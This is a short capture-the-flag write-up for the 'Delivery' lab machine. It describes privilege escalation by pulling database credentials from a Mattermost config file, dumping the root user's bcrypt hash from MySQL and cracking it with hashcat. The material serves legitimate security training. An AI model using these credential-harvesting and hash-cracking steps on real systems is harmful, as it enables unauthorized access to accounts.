# Alternative way to exploit Delivery

## Privilege Escalation

Instead of using local Brute-Force on the root password, it is possible to search for password hashes in the **Mattermost** configuration and crack those.

The configuration file _/opt/mattermost/config/config.json_ contains credentials for the MySQL database:
```
(...)
"SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
(...)
```

Login into the database:
```
mysql -u mmuser -p
```

Enumerating the database for usernames and hashes:
```
MariaDB [(none)]> show databases;
MariaDB [(none)]> use mattermost;

MariaDB [mattermost]> show tables;
MariaDB [mattermost]> describe Users;

MariaDB [mattermost]> select Username,Email,Password from Users;
```
```
+----------------------------------+-------------------------+--------------------------------------------------------------+
| Username                         | Email                   | Password                                                     |
+----------------------------------+-------------------------+--------------------------------------------------------------+
| root                             | root@delivery.htb       | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
(...)
```

This is a **bcrypt hash** that can be cracked with a rule-based attack in **Hashcat** on the password _"PleaseSubscribe!"_:
```
hashcat -m 3200 delivery.hash password.txt -r /usr/share/hashcat/rules/best64.rule
```

After a while it gets cracked and the password for this hash is:
> PleaseSubscribe!21

It can be used switch users to root!
